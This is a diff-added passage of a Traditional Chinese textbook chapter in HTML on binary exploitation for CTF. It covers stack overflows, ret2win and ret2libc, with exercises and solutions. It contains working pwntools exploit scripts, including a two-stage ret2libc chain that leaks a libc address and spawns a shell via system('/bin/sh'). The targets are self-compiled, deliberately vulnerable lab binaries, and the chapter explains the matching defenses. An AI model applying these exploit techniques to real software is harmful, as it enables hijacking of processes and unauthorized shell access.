+      </p>
+      <pre><code class="language-bash">$ ./stack_demo
+buf 位址          = 0x7fffffffe2a0
+authenticated 位址 = 0x7fffffffe2b0     # 差 16 bytes
+Enter your name: alice
+一般使用者,無權限。                       # 正常:authenticated 還是 0
+
+$ ./stack_demo
+Enter your name: AAAAAAAAAAAAAAAAAAAA    # 20 個 A(超過 16)
+Welcome admin! FLAG{stack_overflow_overwrote_the_variable}</code></pre>
+      <p>
+        為什麼是 17 個字以上才生效?因為填滿 16 個字剛好填滿 <code>buf</code>,第 17 個位元組起才寫進 <code>authenticated</code>。
+        用 gdb 可以親眼看到 <code>authenticated</code> 被 <code>A</code>(也就是 <code>0x41</code>)染色:
+      </p>
+      <pre><code class="language-bash">$ gdb ./stack_demo
+(gdb) break 18                 # 在 if (s.authenticated) 那行斷下
+(gdb) run
+Enter your name: AAAAAAAAAAAAAAAAAAAA
+(gdb) p s                      # 看整個 struct
+$1 = {buf = "AAAAAAAAAAAAAAAA", authenticated = 0x41414141}   # ← 被 A 蓋成非 0!
+(gdb) x/8xw s.buf              # 以 word(4 bytes)檢視:0x41 一路蓋過去
+0x7fffffffe2a0: 0x41414141  0x41414141  0x41414141  0x41414141
+0x7fffffffe2b0: 0x41414141  ...         ← 這格就是 authenticated</code></pre>
+      <p>
+        這就是 Pwn 的「啊哈」時刻:<strong>沒有長度檢查的輸入,會讓資料「寫出界」,蓋掉記憶體裡的鄰居。</strong>
+        在這個例子,我們蓋掉的是一個小小的權限旗標。但如果鄰居不是普通變數,而是<strong>返回位址</strong>呢?
+        那我們蓋掉的,就不只是一個值,而是程式「下一步要去哪」的決定權——這就是下一節的主題。
+      </p>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 72.2 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>有一個自編譯的函式如下。請(a)畫出它的 stack frame(從低位址的 <code>buf</code> 到高位址的返回位址,標出各部分大小);
+          (b)算出「從 <code>buf</code> 開頭寫到返回位址」需要幾個位元組(也就是 offset);(c)說明這個 offset 為什麼<strong>不是</strong>單純等於陣列大小。</p>
+          <pre><code class="language-c">void vuln(void) {
+    char buf[64];
+    read(0, buf, 0x100);   // 最多讀 256 bytes 進只有 64 bytes 的 buf
+}</code></pre>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <p><strong>(a) stack frame(由低到高):</strong></p>
+              <pre><code class="language-text">低位址 ┌──────────────────────────┐  ← rsp(堆疊頂),buf[0] 在這
+       │  char buf[64]            │  64 bytes
+       ├──────────────────────────┤
+       │  存起來的 rbp(舊框架指標) │   8 bytes
+       ├──────────────────────────┤
+       │  返回位址 return address  │   8 bytes  ← 寫到這裡就劫持流程
+高位址 └──────────────────────────┘  ← 回到 main()</code></pre>
+              <p><strong>(b) offset = 64 + 8 = 72。</strong>從 <code>buf[0]</code> 開始,要先填滿 64 bytes 的 <code>buf</code>,
+              再蓋掉 8 bytes 的「存起來的 rbp」,接著第 73 個 byte 起,寫的就是返回位址。</p>
+              <p><strong>(c) 為什麼不是 64?</strong>因為 <code>buf</code> 和返回位址之間,還夾著編譯器存起來的
+              <strong>舊框架指標(saved rbp,8 bytes)</strong>。所以要多加這 8。
+              (有時編譯器還會為了對齊塞入額外的填充 bytes,所以 offset 最可靠的求法,
+              是用工具實測——這是下一節的 <code>cyclic</code> 技巧。)</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>緩衝區溢位 I:ret2win——把返回位址改成「贏」</h2>
+      <p>
+        現在我們把溢位的目標,從「旁邊的變數」升級成「返回位址」。這類入門 Pwn 題有個經典名字叫
+        <strong>ret2win</strong>(return-to-win):題目裡藏著一個永遠不會被正常呼叫的「勝利函式」
+        (慣例叫 <code>win()</code>,它會印出旗或開 shell),你的任務,就是讓程式 <code>return</code> 時
+        <strong>「跳去」</strong>那個函式。我們用這支自編譯的 <code>vuln.c</code> 當靶:
+      </p>
+      <pre><code class="language-c">// vuln.c —— ret2win 教學靶機
+// 編譯:gcc -fno-stack-protector -no-pie -o vuln vuln.c
+//   -no-pie:讓 win 的位址固定好找;-fno-stack-protector:關掉金絲雀
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+void win(void) {                       // ← 永遠不會被正常呼叫的「勝利函式」
+    puts("流程被你劫持了!這是你的旗:");
+    puts("FLAG{ret2win_overwrite_the_return_address}");
+}
+
+void vuln(void) {
+    char buf[64];
+    puts("送你一段輸入,盡量塞:");
+    read(0, buf, 0x100);               // ⚠️ 讀最多 256 bytes 進 64 bytes 的 buf
+    puts("掰掰~");
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    vuln();
+    return 0;
+}</code></pre>
+
+      <h3>第一步:checksec——先看清楚對手開了什麼防護</h3>
+      <p>
+        Pwn 的第一個動作,永遠是用 <code>checksec</code>(pwntools 內建)檢查這個執行檔開了哪些保護機制。
+        這決定了你能用什麼招:
+      </p>
+      <pre><code class="language-bash">$ checksec --file=./vuln
+    Arch:     amd64-64-little          # 64 位元、小端
+    RELRO:    Partial RELRO
+    Stack:    No canary found          # 沒有金絲雀 → 可以安全地蓋過返回位址
+    NX:       NX enabled               # 堆疊不可執行(這題用不到 shellcode,沒差)
+    PIE:      No PIE (0x400000)        # 程式載入位址固定 → win 的位址是定值,好找</code></pre>
+      <p>
+        對 ret2win 來說,這是一手好牌:<strong>沒有 canary</strong>(蓋返回位址不會被擋)、<strong>No PIE</strong>
+        (<code>win</code> 的位址固定,不必猜)。這些「防護全關」是<em>教學刻意</em>的安排;下一節我們會看到,
+        真實題目把它們打開後,難度會陡升——而那,正是這些防護的價值所在。
+      </p>
+
+      <h3>第二步:用 cyclic 系統化地找出 offset</h3>
+      <p>
+        我們在練習 72.2 心算過 offset = 72。但與其瞎猜、與其擔心編譯器偷塞了填充位元組,
+        專業做法是用 pwntools 的 <strong><code>cyclic</code></strong>:它產生一段「每 4 個字元都獨一無二」的字串
+        (<code>aaaabaaacaaad...</code>)。把它餵進去,程式崩潰時返回位址會被某 4 個 byte 蓋掉;
+        我們看崩潰時的暫存器內容,反查那 4 個 byte 在原字串的<em>位置</em>,就精準得到 offset:
+      </p>
+      <pre><code class="language-bash">$ cyclic 200                   # 產生 200 字的不重複序列
+aaaabaaacaaadaaaeaaaf...
+$ gdb ./vuln
+(gdb) run                      # 把上面那串貼進去
+# ── 程式崩在 ret,因為返回位址變成了一段 cyclic ──
+(gdb) x/gx $rsp                # 看堆疊頂被蓋成什麼
+0x7fffffffe2c8: 0x6161617461616173
+(gdb) cyclic -l 0x6161617461616173    # 反查這 8 byte 在序列裡的位置
+72                              # ← offset 確認是 72</code></pre>
+
+      <h3>第三步:取得 win 的位址,組出 payload</h3>
+      <p>
+        因為這題 <code>No PIE</code>,<code>win</code> 的位址是固定的,直接查符號表就行:
+      </p>
+      <pre><code class="language-bash">$ nm vuln | grep win           # 或 objdump -d vuln | grep '&lt;win&gt;'
+0000000000401156 T win</code></pre>
+      <p>
+        現在 payload 的配方一目了然:<strong>填 72 個垃圾位元組墊到返回位址,然後放上 <code>win</code> 的位址</strong>
+        (記得用 <code>p64</code> 轉成小端)。等 <code>vuln()</code> 執行 <code>ret</code>,CPU 就會「跳去」<code>win</code>。
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 360" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="24" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">ret2win:用溢位把返回位址換成 win 的位址</text>
+
+  <!-- normal column -->
+  <text x="180" y="52" text-anchor="middle" font-size="12" font-weight="800" fill="#2f6f6a">正常 return</text>
+  <rect x="80" y="64" width="200" height="48" fill="#f6e7dd" stroke="#b4541f" stroke-width="2"/>
+  <text x="180" y="84" text-anchor="middle" font-size="11" font-weight="700" fill="#b4541f">返回位址 → main</text>
+  <text x="180" y="101" text-anchor="middle" font-size="10" fill="#4a5159">(完好,回到呼叫者)</text>
+  <rect x="80" y="112" width="200" height="34" fill="#ede9fe" stroke="#8b5cf6" stroke-width="2"/>
+  <text x="180" y="134" text-anchor="middle" font-size="10" fill="#1f2328">存起來的 rbp</text>
+  <rect x="80" y="146" width="200" height="90" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="180" y="178" text-anchor="middle" font-size="11" font-weight="700" fill="#2f6f6a">buf[64]</text>
+  <text x="180" y="198" text-anchor="middle" font-size="10" fill="#4a5159">放正常輸入</text>
+
+  <!-- payload column -->
+  <text x="540" y="52" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">送出 payload 後</text>
+  <rect x="440" y="64" width="200" height="48" fill="#b4541f" stroke="#7a2f10" stroke-width="2"/>
+  <text x="540" y="84" text-anchor="middle" font-size="11" font-weight="800" fill="#fff">返回位址 → win</text>
+  <text x="540" y="101" text-anchor="middle" font-size="10" fill="#ffe3d3">p64(0x401156),被覆寫!</text>
+  <rect x="440" y="112" width="200" height="34" fill="#d98a5a" stroke="#7a2f10" stroke-width="2"/>
+  <text x="540" y="134" text-anchor="middle" font-size="10" fill="#fff">"AAAAAAAA"(蓋掉 rbp)</text>
+  <rect x="440" y="146" width="200" height="90" fill="#d98a5a" stroke="#7a2f10" stroke-width="2"/>
+  <text x="540" y="178" text-anchor="middle" font-size="11" font-weight="700" fill="#fff">"AAAA…"(64 bytes)</text>
+  <text x="540" y="198" text-anchor="middle" font-size="10" fill="#ffe3d3">填滿 buf 的垃圾</text>
+
+  <!-- payload recipe -->
+  <rect x="80" y="262" width="560" height="40" rx="6" fill="#f3f4f6" stroke="#8a929b"/>
+  <text x="360" y="287" text-anchor="middle" font-size="13" font-family="monospace" fill="#1f2328">payload = b"A" * 72  +  p64(win)</text>
+  <text x="180" y="324" text-anchor="middle" font-size="10" fill="#8a929b">↑ 72 個墊片(填到返回位址)</text>
+  <text x="540" y="324" text-anchor="middle" font-size="10" fill="#b4541f">↑ 蓋上去的新「返回位址」</text>
+
+  <line x1="360" y1="190" x2="360" y2="86" stroke="#b4541f" stroke-width="2.5" marker-end="url(#r2wA)"/>
+  <text x="372" y="150" font-size="10" fill="#b4541f">寫入方向</text>
+  <defs>
+    <marker id="r2wA" markerWidth="10" markerHeight="10" refX="5" refY="2" orient="auto"><path d="M0,8 L5,0 L10,8 Z" fill="#b4541f"/></marker>
+  </defs>
+</svg>
+        <figcaption>圖 72-4:ret2win 的溢位覆蓋。前 72 個位元組是把資料墊到返回位址的「填充」,接著的 8 個位元組 <code>p64(win)</code> 蓋掉原本的返回位址。<code>vuln()</code> 執行 <code>ret</code> 時,CPU 信任地跳到這個(被竄改的)位址——於是控制權交到了 <code>win()</code> 手上。</figcaption>
+      </div>
+
+      <h3>第四步:用 pwntools 寫出 exploit</h3>
+      <p>
+        手動用 <code>echo</code> 拼小端位元組既痛苦又易錯。Pwn 的標準工具是 <strong>pwntools</strong>——
+        一個 Python 函式庫,把「啟動題目、收送資料、打包位址」全包辦了。完整的 ret2win exploit 短得驚人:
+      </p>
+      <pre><code class="language-python"># solve.py —— ret2win 教學題的 exploit(只對你自己編譯的 vuln 有效)
+from pwn import *
+
+e  = ELF("./vuln")              # 載入執行檔,讀它的符號表
+io = process("./vuln")         # 在本機啟動這支程式;授權遠端題改成 remote(host, port)
+
+OFFSET = 72                    # buf(64) + 存起來的 rbp(8);用 cyclic 確認過
+win    = e.symbols["win"]      # 直接查 win 的位址(No PIE,位址固定)
+log.info("win @ %#x", win)
+
+payload  = b"A" * OFFSET       # 1) 墊到返回位址
+payload += p64(win)            # 2) 用小端把 win 的位址蓋上去
+
+io.sendline(payload)           # 送出
+io.interactive()              # 接管互動 → 應印出 FLAG{ret2win_overwrite_the_return_address}</code></pre>
+
+      <div class="callout warn">
+        <div class="ico">⚠️</div>
+        <div class="body">
+          <span class="c-title">最常見的坑:堆疊 16-byte 對齊(movaps)</span>
+          <p>你照上面打,有時會發現程式跳進 <code>win</code> 後,卻在裡面的 <code>puts</code>/<code>printf</code> 崩潰。
+          這通常不是你算錯,而是 x86-64 的一條規矩:呼叫某些函式時,堆疊指標必須對齊到 16 的倍數
+          (否則 <code>movaps</code> 這類指令會出錯)。我們的 payload 改變了堆疊的對齊。
+          解法很簡單:在 <code>win</code> 前面多塞一個「什麼都不做、只執行一次 <code>ret</code>」的小工具,把堆疊推回對齊:</p>
+          <pre><code class="language-python">ret = ROP(e).find_gadget(["ret"])[0]      # 找一個單獨的 ret 指令位址
+payload = b"A" * OFFSET + p64(ret) + p64(win)   # 多墊一個 ret 再跳 win</code></pre>
+          <p>這個「找一小段現成指令來用」的動作,就是 ROP 的雛形——下一節登場。</p>
+        </div>
+      </div>
+
+      <div class="callout key">
+        <div class="ico">🔑</div>
+        <div class="body">
+          <span class="c-title">ret2win 的本質,就是第 36 章那條因果鏈的「實作」</span>
+          <p><strong>第 36 章</strong>我們從防禦者角度說過:「能寫入記憶體」會升級成「能改寫程式下一步去哪」。
+          ret2win 就是這句話的最小可運作版本:<strong>沒有邊界檢查的 <code>read</code>/<code>gets</code>(資料越界)
+          → 越界資料蓋到返回位址(改寫控制流程)→ <code>ret</code> 跳去攻擊者選的函式(劫持執行)。</strong>
+          看懂這條鏈,你就同時看懂了「為什麼一定要做邊界檢查」。攻擊與防禦,是同一枚硬幣的兩面。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 72.3 <span class="badge">挑戰</span></div>
+        <div class="ex-body">
+          <p>給你一支<strong>自己編譯</strong>的 ret2win 靶機:有一個 <code>char buf[40]</code> 的 <code>vuln()</code> 用
+          <code>gets(buf)</code> 讀輸入,另有一個藏起來的 <code>void win(void)</code> 會印旗。<code>checksec</code> 顯示
+          No canary、No PIE。請寫出 pwntools exploit 的骨架(假設 offset 已用 cyclic 確認為 48),
+          並說明每一行在做什麼。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python">from pwn import *
+
+e  = ELF("./vuln")             # 載入 ELF,等下要查 win 的位址
+io = process("./vuln")        # 本機啟動靶機(授權遠端題:io = remote("host", port))
+
+OFFSET = 48                   # buf(40) + 存起來的 rbp(8) = 48;已用 cyclic 驗證
+win    = e.symbols["win"]     # No PIE → win 位址固定,直接查符號表
+
+# 若遇到 movaps 對齊問題,改成:
+#   ret = ROP(e).find_gadget(["ret"])[0]
+#   payload = b"A"*OFFSET + p64(ret) + p64(win)
+payload = b"A" * OFFSET + p64(win)   # 墊 48 + 蓋上 win 的位址(小端)
+
+io.sendline(payload)          # 送出 payload
+io.interactive()             # 接管互動,讀取印出的 FLAG{...}</code></pre>
+              <p>關鍵觀念:<code>OFFSET</code> 是「從 buf 寫到返回位址要幾個 byte」,<code>p64(win)</code> 是
+              「蓋上去的新返回位址(小端打包)」。整個攻擊只有「填到返回位址、換成 win」這一句話。
+              這只對你自己編譯、刻意留漏洞的靶機有效——真實程式會開啟下一節的各種防護。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>緩衝區溢位 II:保護機制與 ret2libc</h2>
+      <p>
+        ret2win 之所以那麼順,是因為我們把所有防護都關了。但你現在用的這台電腦,
+        編譯器和作業系統其實疊了好幾道防線,專門對付這類攻擊。理解這些防線「各擋什麼」,
+        是這一節的重點——也是<strong>第 36 章</strong>那個「現代防護三層網」的深入版。
+      </p>
+
+      <h3>四道現代防線:它們各自防什麼</h3>
+      <div class="table-wrap">
+      <table>
+        <thead>
+          <tr><th>保護機制</th><th>它做什麼</th><th>擋住哪種攻擊</th><th>繞過的<em>概念</em></th></tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>Stack Canary</strong><br>(堆疊金絲雀)</td>
+            <td>在返回位址前放一個隨機「哨兵值」,函式返回前檢查它有沒有被改動,被改就立刻終止程式。</td>
+            <td>用連續溢位<strong>蓋過返回位址</strong>——因為要蓋到返回位址,一定會先踩爛中間的 canary。</td>
+            <td>想辦法先<strong>洩漏</strong> canary 的值,再把它原封不動填回去(較進階)。</td>
+          </tr>
+          <tr>
+            <td><strong>NX / DEP</strong><br>(資料不可執行)</td>
+            <td>把堆疊、堆積標記成「不可執行」。CPU 拒絕把這些區域的資料當成指令來跑。</td>
+            <td>把機器碼(<strong>shellcode</strong>)塞進 buf 再跳過去執行——資料區不可執行,直接崩。</td>
+            <td>不自己帶程式碼,改去<strong>借用程式裡既有的程式碼</strong>(ret2libc / ROP)。</td>
+          </tr>
+          <tr>
+            <td><strong>ASLR</strong><br>(位址空間隨機化)</td>
+            <td>每次執行,都把堆疊、堆積、共享函式庫(libc)隨機擺到不同位址。</td>
+            <td>事先寫死某個位址(如 <code>system</code> 的位址)——因為每次都不一樣,猜不到。</td>
+            <td>先<strong>洩漏一個真實位址</strong>,用「固定的偏移差」反推出其他位址。</td>
+          </tr>
+          <tr>
+            <td><strong>PIE</strong><br>(位置無關執行檔)</td>
+            <td>把 ASLR 也套用到<strong>程式本體</strong>:連你自己的函式(如 <code>win</code>)位址每次都變。</td>
+            <td>ret2win 那種「直接查 <code>win</code> 固定位址」的玩法。</td>
+            <td>先洩漏程式本體的某個位址,再算出 <code>win</code> 的真正位址。</td>
+          </tr>
+        </tbody>
+      </table></div>
+
+      <div class="callout note">
+        <div class="ico">🛡️</div>
+        <div class="body">
+          <span class="c-title">這四道防線,是「減災」而非「根治」</span>
+          <p>注意上表每一列都有「繞過的概念」——這正說明:<strong>這些防護大幅提高攻擊成本,但都不是無敵的。</strong>
+          它們的價值,在於把「填幾個 A 就能贏」的入門攻擊,變成「要先洩漏位址、再串好幾個步驟」的高難度工程。
+          但真正的<strong>根治</strong>,永遠是<strong>第 36 章</strong>那句話:一開始就別寫出越界——做邊界檢查、用安全函式,
+          或乾脆改用記憶體安全的語言(Rust、Go)。防護是給「萬一還是寫錯了」的安全網,不是不寫邊界檢查的藉口。</p>
+        </div>
+      </div>
+
+      <h3>當 NX 擋住 shellcode:改用 ret2libc</h3>
+      <p>
+        早年的 Pwn 玩法,是把一段機器碼(shellcode,通常是「開一個 shell」的指令)塞進 buf,
+        再把返回位址指向它。但 <strong>NX 一開,這條路就斷了</strong>——堆疊不可執行,你塞的資料跳過去也跑不動。
+        於是有了一個漂亮的轉念:<strong>既然不能「自己帶程式碼」,那就「借用程式裡已經有的程式碼」。</strong>
+      </p>
+      <p>
+        借誰的?幾乎每支 C 程式都會連結到 <strong>libc</strong>(C 標準函式庫),而 libc 裡正好有一個威力無窮的函式:
+        <code>system()</code>。如果我們能讓程式去執行 <code>system("/bin/sh")</code>,就等於開出一個 shell。
+        這個手法叫 <strong>ret2libc</strong>(return-to-libc):不跳去自己的 <code>win</code>,而是跳去 libc 的 <code>system</code>。
+        但這裡卡著一個 ASLR 的難關——libc 每次載入的位址都不同,我們<strong>事先不知道 <code>system</code> 在哪</strong>。
+      </p>
+
+      <h3>兩階段攻擊:先洩漏,再開 shell</h3>
+      <p>
+        破解 ASLR 的標準思路,是<strong>分兩階段</strong>:第一階段先「問」程式某個函式的真實位址,
+        利用 libc 內部「函式之間的偏移差是固定的」這個事實,反推出整個 libc 的載入基底(base);
+        第二階段再用算出的位址,呼叫 <code>system("/bin/sh")</code>。
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="24" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">ret2libc 兩階段:洩漏位址 → 呼叫 system("/bin/sh")</text>
+
+  <!-- stage 1 -->
+  <rect x="30" y="50" width="320" height="150" rx="12" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="190" y="74" text-anchor="middle" font-size="12" font-weight="800" fill="#2f6f6a">階段一:洩漏(繞 ASLR)</text>
+  <g font-size="10.5" fill="#4a5159">
+    <text x="46" y="98">① 溢位後,用一小段現成指令</text>
+    <text x="46" y="116">　 (pop rdi; ret)把 puts 的位址</text>
+    <text x="46" y="134">　 放進 rdi 當參數</text>
+    <text x="46" y="154">② 呼叫程式自己的 puts</text>
+    <text x="46" y="172">　 → 印出 puts 的「真實位址」</text>
+    <text x="46" y="190">③ 印完回到 vuln,等第二段</text>
+  </g>
+
+  <!-- compute -->
+  <rect x="30" y="210" width="320" height="58" rx="10" fill="#fef3c7" stroke="#b4541f" stroke-width="2"/>
+  <text x="190" y="232" text-anchor="middle" font-size="11" font-weight="800" fill="#b4541f">用洩漏值算出 libc 基底</text>
+  <text x="190" y="252" text-anchor="middle" font-size="10.5" font-family="monospace" fill="#1f2328">libc_base = 洩漏值 − puts 的偏移</text>
+
+  <!-- stage 2 -->
+  <rect x="370" y="50" width="320" height="150" rx="12" fill="#f6e7dd" stroke="#b4541f" stroke-width="2"/>
+  <text x="530" y="74" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">階段二:拿 shell</text>
+  <g font-size="10.5" fill="#4a5159">
+    <text x="386" y="98">④ 有了 libc_base,就能算出</text>
+    <text x="386" y="116">　 system 與 "/bin/sh" 的位址</text>
+    <text x="386" y="136">⑤ 再次溢位:pop rdi; ret 把</text>
+    <text x="386" y="154">　 "/bin/sh" 放進 rdi</text>
+    <text x="386" y="172">⑥ 跳到 system → system("/bin/sh")</text>
+    <text x="386" y="190" font-weight="700" fill="#b4541f">　 → 開出 shell → cat flag.txt</text>
+  </g>
+
+  <!-- arrows -->
+  <line x1="190" y1="268" x2="190" y2="300" stroke="#b4541f" stroke-width="2" marker-end="url(#r2lA)"/>
+  <line x1="350" y1="125" x2="368" y2="125" stroke="#8a929b" stroke-width="2" marker-end="url(#r2lB)"/>
+
+  <rect x="30" y="300" width="660" height="56" rx="10" fill="#1f2328"/>
+  <text x="360" y="324" text-anchor="middle" font-size="11" font-weight="800" fill="#fff">關鍵洞見:libc 內部「函式間的偏移差」是固定的——洩漏任何一個函式的真實位址,</text>
+  <text x="360" y="342" text-anchor="middle" font-size="11" font-weight="800" fill="#cfe6e2">就能反推出整個 libc 的擺放位置,於是 system 與 "/bin/sh" 的位址也算得出來。</text>
+
+  <defs>
+    <marker id="r2lA" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#b4541f"/></marker>
+    <marker id="r2lB" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8a929b"/></marker>
+  </defs>
+</svg>
+        <figcaption>圖 72-5:ret2libc 的兩階段。階段一靠「洩漏一個已知函式的真實位址 → 反推 libc 基底」打敗 ASLR;階段二用算出的位址呼叫 <code>system("/bin/sh")</code>。整套利用的是「libc 內部偏移固定」這個事實。</figcaption>
+      </div>
+
+      <p>
+        下面是這套兩階段攻擊的 pwntools 骨架(針對自編譯、NX on、No PIE 的 <code>vuln2</code> 教學靶機)。
+        重點是讀懂<strong>結構</strong>,不必背 API:
+      </p>
+      <pre><code class="language-python"># ret2libc 教學骨架(概念示意,僅對自編譯的 vuln2 有效)
+from pwn import *
+
+e    = ELF("./vuln2")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")   # 你系統的 libc 路徑可能不同
+io   = process("./vuln2")
+
+OFFSET  = 72
+rop     = ROP(e)
+POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]   # 「把下一個值放進 rdi」的現成小工具
+RET     = rop.find_gadget(["ret"])[0]              # 對齊用
+
+# ── 階段一:用 puts 印出 puts 自己的真實位址,藉此算出 libc 基底(繞 ASLR)──
+payload = flat(
+    b"A" * OFFSET,
+    POP_RDI, e.got["puts"],    # rdi = puts 在 GOT 裡的位址(= puts 的真實位址)
+    e.plt["puts"],             # 呼叫 puts(...) → 印出那個真實位址
+    e.symbols["vuln"],         # 印完回到 vuln,等第二段
+)
+io.sendline(payload)
+leak = u64(io.recvline().strip().ljust(8, b"\x00"))   # 收回洩漏的位址,還原成整數
+libc.address = leak - libc.symbols["puts"]            # libc 基底 = 洩漏值 − puts 偏移
+log.success("libc base = %#x", libc.address)
+
+# ── 階段二:ret2libc 呼叫 system("/bin/sh") ──
+binsh = next(libc.search(b"/bin/sh\x00"))             # libc 裡現成的字串 "/bin/sh"
+payload2 = flat(
+    b"A" * OFFSET,
+    RET,                       # 多一個 ret 對齊堆疊(movaps)
+    POP_RDI, binsh,            # rdi = "/bin/sh"
+    libc.symbols["system"],    # system("/bin/sh")
+)
+io.sendline(payload2)
+io.interactive()              # 拿到 shell 後:cat flag.txt</code></pre>
+
+      <div class="callout note">
+        <div class="ico">🧩</div>
+        <div class="body">
+          <span class="c-title">ROP,一句話</span>
+          <p>你注意到 <code>pop rdi; ret</code> 這種「借一小段現成指令」的招數了嗎?把<strong>許多</strong>這種以
+          <code>ret</code> 結尾的小片段(叫 <strong>gadget</strong>)像串珠子一樣串起來,就能在「完全不注入任何新程式碼」
+          的前提下,拼湊出任意的運算邏輯——這就是 <strong>ROP(Return-Oriented Programming,返回導向程式設計)</strong>。
+          ret2libc 是 ROP 最簡單的特例(只串了「設參數 + 跳 system」)。ROP 是繞過 NX 的萬用鑰匙,
+          也是現代 Pwn 的核心技術;它的進階(找 gadget、串長鏈、繞 canary/PIE)是一整個世界,
+          留待你在 pwn.college 這類平台繼續鑽研。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 72.4 <span class="badge">思考</span></div>
+        <div class="ex-body">
+          <p>用你自己的話,分別解釋 <strong>NX</strong>、<strong>ASLR</strong>、<strong>Stack Canary</strong> 各自擋住哪一種攻擊手法,
+          以及為什麼光靠其中一個還不夠、要三個一起上。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <ul>
+                <li><strong>NX(資料不可執行):</strong>擋的是「把 shellcode(機器碼)塞進 buf 再跳去執行」這招——
+                堆疊被標成不可執行,CPU 拒絕跑那裡的資料。但它<strong>擋不住 ret2libc / ROP</strong>,
+                因為那些手法是去執行<em>程式裡既有的、本來就可執行的</em>程式碼,沒有「執行資料區」。</li>
+                <li><strong>ASLR(位址隨機化):</strong>擋的是「事先寫死位址」——既然每次 libc/堆疊位址都不同,
+                攻擊者就沒法把 <code>system</code> 的位址寫死在 payload 裡。但它<strong>擋不住「先洩漏一個位址再反推」</strong>:
+                只要程式有任何能吐出位址的管道(如 ret2libc 階段一的 puts),隨機化就被打穿。</li>
+                <li><strong>Stack Canary(金絲雀):</strong>擋的是「用連續溢位蓋過返回位址」——因為要蓋到返回位址,
+                必先踩爛中間的隨機哨兵值,函式返回前一檢查就終止。但它<strong>擋不住「能讀取/洩漏 canary」</strong>的漏洞,
+                也擋不住不經過「連續覆蓋」的攻擊(如某些任意位址寫)。</li>
+              </ul>
+              <p><strong>為什麼要一起上?</strong>因為它們各防一面,且彼此互補:NX 逼你改用 ROP,而 ROP 需要知道位址——
+              這時 ASLR + PIE 又逼你得先洩漏位址;就算你想直接蓋返回位址,canary 又先攔你一道。
+              三者疊加,把攻擊從「填幾個 A」拉高成「要同時擁有一個洩漏漏洞 + 一個溢位漏洞 + 精密計算」的高門檻工程。
+              這就是<strong>第 36 章</strong>「縱深防禦」在二進位層級的體現。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 72.5 <span class="badge">思考</span></div>
+        <div class="ex-body">
+          <p>解釋 ret2libc 為什麼非得「分兩階段」不可。具體說明:第一階段在做什麼、為什麼需要它?
+          第二階段又怎麼用第一階段的成果?如果題目<strong>關掉了 ASLR</strong>,還需要第一階段嗎?</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <p><strong>為什麼分兩階段:</strong>因為 ASLR 讓 libc(以及 <code>system</code>、<code>"/bin/sh"</code>)
+              每次執行的位址都不同,攻擊者<strong>事先不知道要跳去哪</strong>。</p>
+              <ul>
+                <li><strong>第一階段(洩漏):</strong>利用溢位,讓程式呼叫它自己就有的 <code>puts</code>,
+                去印出某個已知函式(例如 <code>puts</code> 本身)的<strong>真實執行期位址</strong>。
+                因為 libc 內部「函式之間的偏移差是固定的」,知道一個真實位址,就能算出
+                <code>libc 基底 = 洩漏值 − 該函式在 libc 裡的偏移</code>。印完位址後,讓流程<strong>回到有漏洞的函式</strong>,
+                準備接收第二段輸入。</li>
+                <li><strong>第二階段(拿 shell):</strong>有了 libc 基底,就能算出 <code>system</code> 與 <code>"/bin/sh"</code>
+                字串的真實位址,再發一次溢位 payload:用 <code>pop rdi; ret</code> 把 <code>"/bin/sh"</code> 設成參數,
+                然後跳到 <code>system</code>,完成 <code>system("/bin/sh")</code>,開出 shell。</li>
+              </ul>
+              <p><strong>如果關掉 ASLR:</strong>那麼 libc 位址每次都一樣、是定值,你可以直接查出 <code>system</code> 與
+              <code>"/bin/sh"</code> 的位址寫死在 payload 裡——<strong>就不需要第一階段的洩漏了</strong>,一發入魂。
+              這也再次說明:ASLR 的唯一作用,就是逼出「洩漏」這個額外步驟;一旦關掉,攻擊難度大幅下降。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>pwntools 自動化:把工具串成一條流水線</h2>
+      <p>
+        你可能注意到了:從第一個 pwntools 腳本開始,我們就在「自動」跟題目互動——
+        而不是手動一個一個位元組地敲。這不是偷懶,而是 Pwn 的<strong>必要技能</strong>。
+        為什麼?因為真正的 Pwn 題往往是<strong>跑在遠端伺服器</strong>的網路服務:它會先印一段提示、
+        要你回一個值、再印下一段……如果還牽涉到「洩漏位址 → 即時算出新位址 → 送第二段 payload」這種需要
+        <strong>動態計算</strong>的互動,人手根本來不及、也算不準。你需要一個程式,替你一問一答。
+      </p>
+      <p>
